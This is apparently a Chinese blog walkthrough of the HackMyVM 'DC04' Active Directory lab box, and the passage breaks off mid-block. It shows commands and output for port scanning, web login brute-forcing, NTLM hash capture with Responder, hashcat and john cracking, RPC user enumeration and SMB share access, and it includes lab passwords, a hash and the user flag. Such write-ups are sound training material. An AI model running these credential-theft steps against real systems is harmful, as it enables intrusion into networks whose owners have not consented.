{"pageProps":{"postData":{"id":"HackMyVMDC04","contentHtml":"<h1>DC04.</h1>\n<blockquote>\n<p><a href=\"https://hackmyvm.eu/machines/machine.php?vm=DC04\">https://hackmyvm.eu/machines/machine.php?vm=DC04</a></p>\n</blockquote>\n<p>Notes: <strong>Well, no more easy kakes. Hope you enjoy this one too.</strong></p>\n<h2>前期踩点</h2>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/test/listen11  nmap -sP 192.168.56.0/24                   \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-14 03:06 EST\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.1\nHost is up (0.00039s latency).\nMAC Address: 0A:00:27:00:00:09 (Unknown)\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.2\nHost is up (0.00032s latency).\nMAC Address: 08:00:27:F3:E1:79 (Oracle VirtualBox virtual NIC)\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.126\nHost is up (0.00068s latency).\nMAC Address: 08:00:27:00:05:AB (Oracle VirtualBox virtual NIC)\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.4\nHost is up.\nNmap <span class=\"hljs-keyword\">done</span>: 256 IP addresses (4 hosts up) scanned <span class=\"hljs-keyword\">in</span> 2.03 seconds\n</code></pre>\n<pre><code class=\"hljs language-bash\"> ⚡ root@kali  ~/Desktop/test/listen11  nmap -sT -min-rate 10000 -p- 192.168.56.126\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-14 03:06 EST\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.126\nHost is up (0.00084s latency).\nNot shown: 65517 filtered tcp ports (no-response)\nPORT      STATE SERVICE\n53/tcp    open  domain\n80/tcp    open  http\n88/tcp    open  kerberos-sec\n135/tcp   open  msrpc\n139/tcp   open  netbios-ssn\n389/tcp   open  ldap\n445/tcp   open  microsoft-ds\n464/tcp   open  kpasswd5\n593/tcp   open  http-rpc-epmap\n636/tcp   open  ldapssl\n3268/tcp  open  globalcatLDAP\n3269/tcp  open  globalcatLDAPssl\n5985/tcp  open  wsman\n9389/tcp  open  adws\n49664/tcp open  unknown\n49668/tcp open  unknown\n49674/tcp open  unknown\n49687/tcp open  unknown\nMAC Address: 08:00:27:00:05:AB (Oracle VirtualBox virtual NIC)\n</code></pre>\n<p>啥端口都有</p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/test/listen11  nmap -sT -A -T4 -O -p 80,135,139,445,389 192.168.56.126\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-14 03:10 EST\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.126\nHost is up (0.00061s latency).\n\nPORT    STATE SERVICE       VERSION\n80/tcp  open  http          Apache httpd 2.4.58 ((Win64) OpenSSL/<span class=\"hljs-number\">3.1</span>.<span class=\"hljs-number\">3</span> PHP/<span class=\"hljs-number\">8.2</span>.<span class=\"hljs-number\">12</span>)\n|_http-server-header: Apache/<span class=\"hljs-number\">2.4</span>.<span class=\"hljs-number\">58</span> (Win64) OpenSSL/<span class=\"hljs-number\">3.1</span>.<span class=\"hljs-number\">3</span> PHP/<span class=\"hljs-number\">8.2</span>.<span class=\"hljs-number\">12</span>\n|_http-title: Did not follow redirect to http://soupedecode.local\n<span class=\"hljs-number\">135</span>/tcp open  msrpc         Microsoft Windows RPC\n<span class=\"hljs-number\">139</span>/tcp open  netbios-ssn   Microsoft Windows netbios-ssn\n<span class=\"hljs-number\">389</span>/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)\n<span class=\"hljs-number\">445</span>/tcp open  microsoft-ds?\nMAC Address: <span class=\"hljs-number\">08</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">05</span>:AB (Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least <span class=\"hljs-number\">1</span> open and <span class=\"hljs-number\">1</span> closed port\nDevice type: general purpose\nRunning (JUST GUESSING): Microsoft Windows <span class=\"hljs-number\">2022</span>|<span class=\"hljs-number\">11</span>|<span class=\"hljs-number\">2016</span> (<span class=\"hljs-number\">97</span>%)\nOS CPE: cpe:/o:microsoft:windows_server_2016\nAggressive OS guesses: Microsoft Windows Server <span class=\"hljs-number\">2022</span> (<span class=\"hljs-number\">97</span>%), Microsoft Windows <span class=\"hljs-number\">11</span> <span class=\"hljs-number\">21</span>H2 (<span class=\"hljs-number\">91</span>%), Microsoft Windows Server <span class=\"hljs-number\">2016</span> (<span class=\"hljs-number\">91</span>%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: <span class=\"hljs-number\">1</span> hop\nService Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-time: \n|   date: <span class=\"hljs-number\">2025</span>-<span class=\"hljs-number\">02</span>-<span class=\"hljs-number\">15</span>T00:<span class=\"hljs-number\">10</span>:<span class=\"hljs-number\">27</span>\n|_  start_date: N/A\n| smb2-security-mode: \n|   <span class=\"hljs-number\">3</span>:<span class=\"hljs-number\">1</span>:<span class=\"hljs-number\">1</span>: \n|_    Message signing enabled and required\n|_nbstat: NetBIOS name: DC01, NetBIOS user: &#x3C;unknown>, NetBIOS MAC: <span class=\"hljs-number\">08</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">05</span>:ab (Oracle VirtualBox virtual NIC)\n|_clock-skew: <span class=\"hljs-number\">15</span>h59m57s\n\nTRACEROUTE\nHOP RTT     ADDRESS\n<span class=\"hljs-number\">1</span>   <span class=\"hljs-number\">0.61</span> ms <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.126</span>\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: <span class=\"hljs-number\">1</span> IP address (<span class=\"hljs-number\">1</span> host up) scanned in <span class=\"hljs-number\">51.09</span> seconds\n</code></pre>\n<p>扫出来域名，先将记录添加到<code>hosts</code>文件</p>\n<pre><code class=\"hljs language-less\">⚡ <span class=\"hljs-selector-tag\">root</span>@<span class=\"hljs-selector-tag\">kali</span>  ~/<span class=\"hljs-selector-tag\">Desktop</span>/<span class=\"hljs-selector-tag\">test</span>/<span class=\"hljs-selector-tag\">listen11</span>  <span class=\"hljs-selector-tag\">nmap</span> <span class=\"hljs-selector-tag\">-script</span>=<span class=\"hljs-selector-tag\">vuln</span> <span class=\"hljs-selector-tag\">-p</span> <span class=\"hljs-number\">445</span>,<span class=\"hljs-number\">389</span>,<span class=\"hljs-number\">80</span>,<span class=\"hljs-number\">88</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-selector-class\">.56</span><span class=\"hljs-selector-class\">.126</span>\n<span class=\"hljs-selector-tag\">Starting</span> <span class=\"hljs-selector-tag\">Nmap</span> <span class=\"hljs-number\">7.94S</span><span class=\"hljs-selector-tag\">VN</span> ( <span class=\"hljs-attribute\">https</span>:<span class=\"hljs-comment\">//nmap.org ) at 2025-02-14 03:15 EST</span>\n<span class=\"hljs-attribute\">Stats</span>: <span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">02</span>:<span class=\"hljs-number\">21</span> elapsed; <span class=\"hljs-number\">0</span> hosts completed (<span class=\"hljs-number\">1</span> up), <span class=\"hljs-number\">1</span> undergoing Script Scan\nNSE <span class=\"hljs-attribute\">Timing</span>: About <span class=\"hljs-number\">99.21%</span> done; <span class=\"hljs-attribute\">ETC</span>: <span class=\"hljs-number\">03</span>:<span class=\"hljs-number\">18</span> (<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">01</span> remaining)\nNmap scan report for SOUPEDECODE.LOCAL0 (<span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.126</span>)\nHost is up (<span class=\"hljs-number\">0.00069s</span> latency).                                                                  \n                                                                                                \nPORT    STATE SERVICE                                                                           \n<span class=\"hljs-number\">80</span>/tcp  open  http                                                                              \n|<span class=\"hljs-attribute\">_http-trace</span>: TRACE is enabled                                                                  \n|<span class=\"hljs-attribute\">_http-csrf</span>: Couldn't find any CSRF vulnerabilities.                                                                                                                                            \n| <span class=\"hljs-attribute\">http-slowloris-check</span>:    \n|   <span class=\"hljs-attribute\">VULNERABLE</span>:                                                                                 \n|   Slowloris DOS attack                                                                                                                                                                        \n|     <span class=\"hljs-attribute\">State</span>: LIKELY VULNERABLE\n|     <span class=\"hljs-attribute\">IDs</span>:  <span class=\"hljs-attribute\">CVE</span>:CVE-<span class=\"hljs-number\">2007</span>-<span class=\"hljs-number\">6750</span>                                                                   \n|       Slowloris tries to keep many connections to the target web server open <span class=\"hljs-keyword\">and</span> hold         \n|       them open as long as possible.  It accomplishes this by opening connections to                                                                                                          \n|       the target web server <span class=\"hljs-keyword\">and</span> sending a partial request. By doing so, it starves\n|       the http server's resources causing Denial Of Service.                                  \n|                                                                                               \n|     Disclosure <span class=\"hljs-attribute\">date</span>: <span class=\"hljs-number\">2009</span>-<span class=\"hljs-number\">09</span>-<span class=\"hljs-number\">17</span>               \n|     <span class=\"hljs-attribute\">References</span>:                               \n|       <span class=\"hljs-attribute\">http</span>:<span class=\"hljs-comment\">//ha.ckers.org/slowloris/</span>\n|_      <span class=\"hljs-attribute\">https</span>:<span class=\"hljs-comment\">//cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750                            </span>\n|<span class=\"hljs-attribute\">_http-stored-xss</span>: Couldn't find any stored XSS vulnerabilities.                                \n|<span class=\"hljs-attribute\">_http-dombased-xss</span>: Couldn't find any DOM based XSS.                                           \n| <span class=\"hljs-attribute\">http-enum</span>:                                    \n|   /icons/: Potentially interesting folder w/ directory listing                                \n|   /licenses/: Potentially interesting directory w/ listing on <span class=\"hljs-string\">'apache/2.4.58 (win64) openssl/3.1.3 php/8.2.12'</span>     \n|   /server-info/: Potentially interesting folder                                               \n|_  /server-status/: Potentially interesting folder                                             \n<span class=\"hljs-number\">88</span>/tcp  open  kerberos-sec\n<span class=\"hljs-number\">389</span>/tcp open  ldap                              \n<span class=\"hljs-number\">445</span>/tcp open  microsoft-ds\nMAC <span class=\"hljs-attribute\">Address</span>: <span class=\"hljs-number\">08</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">05</span>:AB (Oracle VirtualBox virtual NIC)                                  \n                                                                                                                                                                                                \nHost script <span class=\"hljs-attribute\">results</span>:                                                                            \n|<span class=\"hljs-attribute\">_smb-vuln-ms10-061</span>: Could <span class=\"hljs-keyword\">not</span> negotiate a <span class=\"hljs-attribute\">connection</span>:<span class=\"hljs-attribute\">SMB</span>: Failed to receive <span class=\"hljs-attribute\">bytes</span>: ERROR\n|<span class=\"hljs-attribute\">_samba-vuln-cve-2012-1182</span>: Could <span class=\"hljs-keyword\">not</span> negotiate a <span class=\"hljs-attribute\">connection</span>:<span class=\"hljs-attribute\">SMB</span>: Failed to receive <span class=\"hljs-attribute\">bytes</span>: ERROR                                                                                                \n|<span class=\"hljs-attribute\">_smb-vuln-ms10-054</span>: false                                                                      \n                                                                                                \nNmap <span class=\"hljs-attribute\">done</span>: <span class=\"hljs-number\">1</span> IP address (<span class=\"hljs-number\">1</span> host up) scanned in <span class=\"hljs-number\">321.27</span> seconds\n</code></pre>\n<p>访问一下<code>HTTP</code>服务，所有请求都被<code>302</code>重定向了</p>\n<p><img src=\"/post-images/HackMyVMDC04/image90.png\" alt=\"image.png\"></p>\n<p>扫描一下网站目录，找一下不被重定向的页面</p>\n<pre><code class=\"hljs language-bash\"> ✘ ⚡ root@kali  ~/Desktop/test/listen11  gobuster <span class=\"hljs-built_in\">dir</span> -u 192.168.56.126 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php,zip,txt,html -b 403,302,404,502\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) &#x26; Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://192.168.56.126\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt\n[+] Negative Status codes:   404,502,403,302\n[+] User Agent:              gobuster/3.6\n[+] Extensions:              php,zip,txt,html\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster <span class=\"hljs-keyword\">in</span> directory enumeration mode\n===============================================================\n/licenses             (Status: 301) [Size: 350] [--> http://192.168.56.126:8080/licenses/]\n/examples             (Status: 503) [Size: 405]\n/server-status        (Status: 200) [Size: 7928]\n/server-info          (Status: 200) [Size: 7928]\nProgress: 1038215 / 1038220 (100.00%)\n===============================================================\nFinished\n===============================================================\n</code></pre>\n<p>访问<code>/server-info</code> ，其中找到了新的域名<code>heartbeat.soupedecode.local</code></p>\n<pre><code class=\"hljs language-bash\">      54: &#x3C;VirtualHost *:8080>\n      55:   DocumentRoot <span class=\"hljs-string\">\"C:/xampp/htdocs/heartbeat\"</span>\n      56:   ServerName heartbeat.soupedecode.local\n      57:   &#x3C;Directory <span class=\"hljs-string\">\"C:/xampp/htdocs/heartbeat\"</span>>\n      58:     AllowOverride All\n        :   &#x3C;/Directory>\n        : &#x3C;/VirtualHost>\n</code></pre>\n<p>访问<code>/server-status</code> 下面是可能有用的东西</p>\n<pre><code class=\"hljs language-bash\">Srv\tPID\tAcc\tM\tSS\tReq\tDur\tConn\tChild\tSlot\tClient\tProtocol\tVHost\tRequest\n0-0\t3372\t0/16362/16362\t_ \t697\t0\t92896\t0.0\t4.71\t4.71 \t127.0.0.1\thttp/1.1\tlocalhost:8080\tGET /t1651.html HTTP/1.1\n0-0\t3372\t0/62075/62075\t_ \t695\t0\t350501\t0.0\t17.88\t17.88 \t127.0.0.1\thttp/1.1\tlocalhost:8080\tGET /nt4stopc.php HTTP/1.1\n0-0\t3372\t0/46681/46681\t_ \t695\t0\t263264\t0.0\t13.44\t13.44 \t127.0.0.1\thttp/1.1\tlocalhost:8080\tGET /nt4stopc.html HTTP/1.1\n0-0\t3372\t0/84562/84562\t_ \t695\t0\t477235\t0.0\t24.35\t24.35 \t127.0.0.1\thttp/1.1\tlocalhost:8080\tGET /t1551.php HTTP/1.1\n0-0\t3372\t0/65893/65893\t_ \t787\t0\t375025\t0.0\t18.98\t18.98 \t127.0.0.1\thttp/1.1\tlocalhost:8080\tGET /0001015.html HTTP/1.1\n0-0\t3372\t0/82531/82531\t_ \t695\t16\t467965\t0.0\t23.77\t23.77 \t127.0.0.1\thttp/1.1\tlocalhost:8080\tGET /ntservpk.zip HTTP/1.1\n0-0\t3372\t0/73861/73861\t_ \t137\t0\t419075\t0.0\t21.27\t21.27 \t127.0.0.1\thttp/1.1\tlocalhost:8080\tGET /path/to/file HTTP/1.1\n0-0\t3372\t0/81296/81296\tW \t0\t0\t459644\t0.0\t23.49\t23.49 \t127.0.0.1\thttp/1.1\tlocalhost:8080\tGET /server-status HTTP/1.1\n0-0\t3372\t0/79703/79703\t_ \t695\t0\t458360\t0.0\t22.90\t22.90 \t127.0.0.1\thttp/1.1\tlocalhost:8080\tGET /nt4stopc.txt HTTP/1.1\n0-0\t3372\t0/51959/51959\t_ \t695\t0\t288538\t0.0\t14.91\t14.91 \t127.0.0.1\thttp/1.1\tlocalhost:8080\tGET /nt4stopc.zip HTTP/1.1\n0-0\t3372\t0/81015/81015\t_ \t695\t14\t458630\t0.0\t23.33\t23.33 \t127.0.0.1\thttp/1.1\tlocalhost:8080\tGET /t15526.html HTTP/1.1\n0-0\t3372\t0/61233/61233\t_ \t695\t0\t346801\t0.0\t17.64\t17.64 \t127.0.0.1\thttp/1.1\tlocalhost:8080\tGET /t1551.txt HTTP/1.1\n0-0\t3372\t0/72400/72400\t_ \t695\t0\t409416\t0.0\t20.85\t20.85 \t127.0.0.1\thttp/1.1\tlocalhost:8080\tGET /t1551.html HTTP/1.1\n0-0\t3372\t0/66083/66083\t_ \t734\t0\t376941\t0.0\t19.03\t19.03 \t127.0.0.1\thttp/1.1\tlocalhost:8080\tGET /securityad.zip HTTP/1.1\n0-0\t3372\t0/76054/76054\t_ \t695\t0\t434350\t0.0\t21.90\t21.90 \t127.0.0.1\thttp/1.1\tlocalhost:8080\tGET /t1551.zip HTTP/1.1\n0-0\t3372\t0/75852/75852\t_ \t696\t0\t431090\t0.0\t21.85\t21.85 \t127.0.0.1\thttp/1.1\tlocalhost:8080\tGET /t1843.zip HTTP/1.1\n0-0\t3372\t0/62499/62499\t_ \t787\t0\t354714\t0.0\t18.00\t18.00 \t127.0.0.1\thttp/1.1\tlocalhost:8080\tGET /sectest.zip HTTP/1.1\n0-0\t3372\t0/86426/86426\t_ \t701\t0\t491898\t0.0\t24.89\t24.89 \t127.0.0.1\thttp/1.1\tlocalhost:8080\tGET /99846.txt HTTP/1.1\n</code></pre>\n<p>访问新获得的域名<code>heartbeat.soupedecode.local</code> ，有一个登录框</p>\n<p><img src=\"/post-images/HackMyVMDC04/image91.png\" alt=\"image.png\"></p>\n<h2>Brute</h2>\n<p>没什么信息，尝试爆破，用户名指定<code>admin</code> ，失败的时候会返回<code>Invalid username or password.</code> 我们过滤掉带<code>Invalid</code> 的返回包（爆破次数多了之后好像服务会不正常，一直返回<code>404</code> 导致我要恢复快照）</p>\n<p><img src=\"/post-images/HackMyVMDC04/image92.png\" alt=\"image.png\"></p>\n<p>最后爆破出密码<code>nimde</code> （恢复了几次快照来着…）</p>\n<p><img src=\"/post-images/HackMyVMDC04/image93.png\" alt=\"image.png\"></p>\n<p>登陆进去出现 <strong><code>Network Share Heartbeat</code></strong> 的框框，让我们输入<code>ip</code>地址</p>\n<p><img src=\"/post-images/HackMyVMDC04/image94.png\" alt=\"image.png\"></p>\n<h2>NTLM relay</h2>\n<p>我们输入自己的<code>IP</code>然后使用<code>wireshark</code>进行抓包，能看见会触发<code>NBNS</code>的数据包</p>\n<p><img src=\"/post-images/HackMyVMDC04/image95.png\" alt=\"image.png\"></p>\n<p>那么第一时间想到的就是<code>NTLM relay</code></p>\n<pre><code class=\"hljs language-bash\">✘ ⚡ root@kali  ~/Desktop/test/DC04  responder -I eth1 -wd                                    \n                                         __\n  .----.-----.-----.-----.-----.-----.--|  |.-----.----.\n  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|\n  |__| |_____|_____|   __|_____|__|__|_____||_____|__|\n                   |__|\n                                                \n           NBT-NS, LLMNR &#x26; MDNS Responder 3.1.5.0\n                                                \n  To support this project:          \n  Github -> https://github.com/sponsors/lgandx\n  Paypal  -> https://paypal.me/PythonResponder\n                                                \n  Author: Laurent Gaffie (laurent.gaffie@gmail.com)\n  To <span class=\"hljs-built_in\">kill</span> this script hit CTRL-C    \n                                                \n                                                \n[+] Poisoners:\n    LLMNR                      [ON]\n    NBT-NS                     [ON]  \n    MDNS                       [ON]          \n    DNS                        [ON]                                                             \n    DHCP                       [ON]    \n                                                                                                \n[+] Servers:                             \n    HTTP server                [ON]     \n    HTTPS server               [ON]\n    WPAD proxy                 [ON]\n    Auth proxy                 [OFF]            \n    SMB server                 [ON]        \n    Kerberos server            [ON]   \n    SQL server                 [ON]\n    FTP server                 [ON]\n    IMAP server                [ON]\n    POP3 server                [ON]\n</code></pre>\n<p>然后在输入框输入我们的<code>IP</code> 然后点击<code>connect</code> ，就能捕获到<code>NET-NTLM hash</code> ，一般是用来破解，破解不出来的话就是进行<code>NTLM relay</code>攻击，但是在我们单台主机渗透的操作中，是无效的，因为<code>NTLM relay</code>攻击是不能重放到凭据真正持有者的主机</p>\n<p><img src=\"/post-images/HackMyVMDC04/image96.png\" alt=\"image.png\"></p>\n<p>我们使用<code>hashcat</code>将其进行爆破</p>\n<pre><code class=\"hljs language-bash\"> ⚡ root@kali  ~/Desktop/test/DC04  hashcat -h | grep NTLM  \n   5500 | NetNTLMv1 / NetNTLMv1+ESS                                  | Network Protocol\n  27000 | NetNTLMv1 / NetNTLMv1+ESS (NT)                             | Network Protocol\n   5600 | NetNTLMv2                                                  | Network Protocol\n  27100 | NetNTLMv2 (NT)                                             | Network Protocol\n   1000 | NTLM                                                       | Operating System\n</code></pre>\n<pre><code class=\"hljs language-bash\"> ⚡ root@kali  ~/Desktop/test/DC04  hashcat -m 5600 <span class=\"hljs-string\">'websvc::soupedecode:784a7be8df22a16f:1FE1FEC178ED7B18FA89DC16CDE89488:0101000000000000009A9D509E7EDB01C216B1F03DB493F10000000002000800370033004C00490001001E00570049004E002D00490031004B004E00460055004B00440052004600310004003400570049004E002D00490031004B004E00460055004B0044005200460031002E00370033004C0049002E004C004F00430041004C0003001400370033004C0049002E004C004F00430041004C0005001400370033004C0049002E004C004F00430041004C0007000800009A9D509E7EDB01060004000200000008003000300000000000000000000000004000000C359CCD8231F583E880A5BB37086129D25FBB6C514ED014EEA3D775A8FC2F8F0A001000000000000000000000000000000000000900220063006900660073002F003100390032002E003100360038002E00350036002E0034000000000000000000'</span> /usr/share/wordlists/rockyou.txt \n</code></pre>\n<p><img src=\"/post-images/HackMyVMDC04/image97.png\" alt=\"image.png\"></p>\n<p>爆破出来密码<code>jordan23</code> 用户名<code>websvc</code></p>\n<p><img src=\"/post-images/HackMyVMDC04/image98.png\" alt=\"image.png\"></p>\n<h2>SMB 信息收集</h2>\n<p>尝试进行远程登陆，但是失败了，应该是没有权限，但是能注意到服务器上还开有<code>SMB</code>等服务</p>\n<pre><code class=\"hljs language-bash\"> ⚡ root@kali  ~/Desktop/test/DC04  smbclient -L 192.168.56.126 -U SOUPEDECODE.LOCAL/websvc%jordan23 \nsession setup failed: NT_STATUS_PASSWORD_EXPIRED\n</code></pre>\n<p>密码过期了，将新密码修改为<code>jordan123</code></p>\n<pre><code class=\"hljs language-sql\"> ⚡ root<span class=\"hljs-variable\">@kali</span>  <span class=\"hljs-operator\">~</span><span class=\"hljs-operator\">/</span>Desktop<span class=\"hljs-operator\">/</span>test<span class=\"hljs-operator\">/</span>DC04  smbclient <span class=\"hljs-operator\">-</span>L <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.126</span> <span class=\"hljs-operator\">-</span>U SOUPEDECODE.LOCAL<span class=\"hljs-operator\">/</span>websvc<span class=\"hljs-operator\">%</span>jordan123\n\n        Sharename       Type      Comment\n        <span class=\"hljs-comment\">---------       ----      -------</span>\n        ADMIN$          Disk      Remote Admin\n        C               Disk\n        C$              Disk      <span class=\"hljs-keyword\">Default</span> share\n        IPC$            IPC       Remote IPC\n        NETLOGON        Disk      Logon server share\n        SYSVOL          Disk      Logon server share\nReconnecting <span class=\"hljs-keyword\">with</span> SMB1 <span class=\"hljs-keyword\">for</span> workgroup listing.\ndo_connect: Connection <span class=\"hljs-keyword\">to</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.126</span> failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)\nUnable <span class=\"hljs-keyword\">to</span> <span class=\"hljs-keyword\">connect</span> <span class=\"hljs-keyword\">with</span> SMB1 <span class=\"hljs-comment\">-- no workgroup available</span>\n</code></pre>\n<p>在<code>websvc</code>用户的家目录可以找到<code>UserFlag</code></p>\n<pre><code class=\"hljs language-bash\">smb: \\<span class=\"hljs-built_in\">users</span>\\> <span class=\"hljs-built_in\">ls</span>\n  .                                  DR        0  Wed Nov  6 20:55:53 2024\n  ..                                DHS        0  Tue Nov  5 18:30:29 2024\n  Administrator                       D        0  Sat Jun 15 15:56:40 2024\n  All Users                       DHSrn        0  Sat May  8 04:26:16 2021\n  Default                           DHR        0  Sat Jun 15 22:51:08 2024\n  Default User                    DHSrn        0  Sat May  8 04:26:16 2021\n  desktop.ini                       AHS      174  Sat May  8 04:14:03 2021\n  fjudy998                            D        0  Wed Nov  6 20:55:33 2024\n  ojake987                            D        0  Wed Nov  6 20:55:16 2024\n  Public                             DR        0  Sat Jun 15 13:54:32 2024\n  rtina979                            D        0  Wed Nov  6 20:54:39 2024\n  websvc                              D        0  Wed Nov  6 20:44:11 2024\n  xursula991                          D        0  Wed Nov  6 20:55:28 2024\n\n                12942591 blocks of size 4096. 10834983 blocks available\n</code></pre>\n<pre><code class=\"hljs language-bash\">smb: \\Users\\websvc\\Desktop\\> <span class=\"hljs-built_in\">dir</span>\n  .                                  DR        0  Thu Nov  7 14:08:21 2024\n  ..                                  D        0  Wed Nov  6 20:44:11 2024\n  user.txt                            A       32  Thu Nov  7 05:07:55 2024\n\n                12942591 blocks of size 4096. 10835331 blocks available\nsmb: \\Users\\websvc\\Desktop\\> mget user.txt\nGet file user.txt? y\ngetting file \\Users\\websvc\\Desktop\\user.txt of size 32 as user.txt (0.9 KiloBytes/sec) (average 0.9 KiloBytes/sec)\n</code></pre>\n<pre><code class=\"hljs language-bash\"> ⚡ root@kali  ~/Desktop/test/DC04  <span class=\"hljs-built_in\">cat</span> user.txt                 \n709e449a996a85aa7deaf18c79515d6a      \n</code></pre>\n<p>并且<code>rtina979</code> 用户的家目录不能进入，那么这个可能就是突破口了，因为<code>135</code>端口，尝试使用<code>RPC</code>来获取枚举用户信息，并将<code>rtina979</code>用户的信息过滤出来</p>\n<p>耶？将它的默认密码也给爆出来了<code>Z~l3JhcV#7Q-1#M</code> ,密码也过期了，将其改为了<code>jordan234</code></p>\n<pre><code class=\"hljs language-bash\"> ⚡ root@kali  ~/Desktop/test/DC04  rpcclient -U SOUPEDDECODE.LOCAL/websvc%jordan123 192.168.56.126 -c <span class=\"hljs-string\">\"querydispinfo\"</span> | grep rtina979\nindex: 0x131f RID: 0x7fd acb: 0x00020010 Account: rtina979      Name: Reed Tina Desc: Default Password Z~l3JhcV#7Q-1#M\n</code></pre>\n<p>使用其再检索<code>SMB</code>的信息</p>\n<pre><code class=\"hljs language-bash\"> ⚡ root@kali  ~/Desktop/test/DC04  netexec smb 192.168.56.126 -u rtina979 -p jordan234 --shares\nSMB         192.168.56.126  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)\nSMB         192.168.56.126  445    DC01             [+] SOUPEDECODE.LOCAL\\rtina979:jordan234 \nSMB         192.168.56.126  445    DC01             [*] Enumerated shares\nSMB         192.168.56.126  445    DC01             Share           Permissions     Remark\nSMB         192.168.56.126  445    DC01             -----           -----------     ------\nSMB         192.168.56.126  445    DC01             ADMIN$                          Remote Admin\nSMB         192.168.56.126  445    DC01             C               READ            \nSMB         192.168.56.126  445    DC01             C$                              Default share\nSMB         192.168.56.126  445    DC01             IPC$            READ            Remote IPC\nSMB         192.168.56.126  445    DC01             NETLOGON        READ            Logon server share \nSMB         192.168.56.126  445    DC01             SYSVOL          READ            Logon server share \n</code></pre>\n<p>发现一个 <code>Report.rar</code> 压缩包，下载之后发现需要密码，</p>\n<pre><code class=\"hljs language-bash\">smb: \\Users\\rtina979\\Documents\\> <span class=\"hljs-built_in\">ls</span>\n  .                                  DR        0  Thu Nov  7 17:35:52 2024\n  ..                                  D        0  Wed Nov  6 20:54:39 2024\n  My Music                        DHSrn        0  Wed Nov  6 20:54:39 2024\n  My Pictures                     DHSrn        0  Wed Nov  6 20:54:39 2024\n  My Videos                       DHSrn        0  Wed Nov  6 20:54:39 2024\n  Report.rar                          A   712046  Thu Nov  7 08:35:49 2024\n\n                12942591 blocks of size 4096. 11014679 blocks available\nsmb: \\Users\\rtina979\\Documents\\> get Report.rar \ngetting file \\Users\\rtina979\\Documents\\Report.rar of size 712046 as Report.rar (26744.4 KiloBytes/sec) (average 26744.5 KiloBytes/sec)\n</code></pre>\n<p>使用<code>john</code>对其破解密码</p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/test/DC04  rar2john Report.rar > <span class=\"hljs-built_in\">hash</span>\n⚡ root@kali  ~/Desktop/test/DC04  <span class=\"hljs-built_in\">cat</span> <span class=\"hljs-built_in\">hash</span>         \nReport.rar:$rar5$16$7b74f4c32feb807c16edc906c283e524$15$872f8d1a914bd1503dac110c7bbb938a$8<span class=\"hljs-variable\">$3e15430028d503b5</span>\n⚡ root@kali  ~/Desktop/test/DC04  john --wordlist=/usr/share/wordlists/rockyou.txt <span class=\"hljs-built_in\">hash</span>\nUsing default input encoding: UTF-8\nLoaded 1 password <span class=\"hljs-built_in\">hash</span> (RAR5 [PBKDF2-SHA256 256/256 AVX2 8x])\nCost 1 (iteration count) is 32768 <span class=\"hljs-keyword\">for</span> all loaded hashes\nWill run 8 OpenMP threads\nPress <span class=\"hljs-string\">'q'</span> or Ctrl-C to abort, almost any other key <span class=\"hljs-keyword\">for</span> status\nPASSWORD123      (Report.rar)     \n1g 0:00:01:29 DONE (2025-02-14 07:27) 0.01115g/s 573.9p/s 573.9c/s 573.9C/s chitra..2pac4ever\nUse the <span class=\"hljs-string\">\"--show\"</span> option to display all of the cracked passwords reliably\nSession completed. \n</code></pre>\n<p>得到密码<code>PASSWORD123</code> ，解压是一个<code>html</code>文件，是对目标编辑进行渗透测试的报告</p>\n<p><img src=\"/post-images/HackMyVMDC04/image99.png\" alt=\"image.png\"></p>\n<p>我么从中获取一些有用的信息</p>\n<pre><code class=\"hljs language-bash\">file_svc:Password123!!\n\nRID cycling:\nDC01$, boliver0, zximena1, emark2, isam3, wulysses4, etc.\n\nSMB 192.168.56.121 445 DC01 [+] soupedecode.local\\ybob317:ybob317\n\nSMB 192.168.56.121 445 DC01 [+] soupedecode.local\\FileServer$:9e564...SNIP...500 (Pwn3d!)\n\nSMB         192.168.56.126  445    DC01             